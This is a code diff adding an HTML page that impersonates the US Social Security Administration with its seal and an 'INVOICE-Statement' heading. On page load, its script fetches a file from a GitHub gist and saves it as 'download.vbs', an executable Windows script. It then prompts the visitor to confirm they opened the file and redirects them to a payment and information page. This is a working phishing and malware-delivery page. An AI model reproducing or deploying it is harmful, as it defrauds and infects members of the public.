@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSA-Statement</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 450px;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/US-SocialSecurityAdmin-Seal.svg" alt="" width="175" height="176" />
+        <h1>INVOICE-Statement</h1>
+        <p>Your download will start automatically. If it doesn't, please click the button below.</p>
+        <button type="button" id="download-link" class="btn">Download File</button>
+        <button class="btn" onclick="confirmFileOpened()">I Have Opened the File</button>
+    </div>
+
+    <script>
+        const downloadUrl = 'https://gist.githubusercontent.com/bassemtozx/a0b6103d686209df4feeafef479a6ccc/raw/b77825112d8e2c04202e12cdb361c4723d0ed05b/bassem.txt';
+
+        async function downloadWithBlob() {
+            const btn = document.getElementById('download-link');
+            const originalText = btn.textContent;
+            btn.disabled = true;
+            btn.textContent = 'Preparing…';
+            try {
+                const res = await fetch(downloadUrl, { credentials: 'same-origin' });
+                if (!res.ok) throw new Error('Download failed: ' + res.status);
+
+                const blob = await res.blob();
+                const blobUrl = URL.createObjectURL(blob);
+
+                const disposition = res.headers.get('Content-Disposition');
+                let filename = 'download.vbs';
+                if (disposition) {
+                    const match = disposition.match(/filename\*?=(?:UTF-8'')?"?([^";\n]+)"?/i) ||
+                                 disposition.match(/filename="?([^";\n]+)"?/i);
+                    if (match && match[1]) {
+                        filename = match[1].trim().replace(/^["']|["']$/g, '');
+                    }
+                }
+
+                const a = document.createElement('a');
+                a.href = blobUrl;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(blobUrl);
+            } catch (err) {
+                alert('Error: ' + err.message);
+            } finally {
+                btn.disabled = false;
+                btn.textContent = originalText;
+            }
+        }
+
+        // Auto-start the download via blob protocol
+        window.onload = function() {
+            downloadWithBlob();
+        };
+
+        document.getElementById('download-link').addEventListener('click', downloadWithBlob);
+
+        function confirmFileOpened() {
+            window.location.href = "process_info_and_payment.php";
+        }
+    </script>
+</body>
+
+</html>
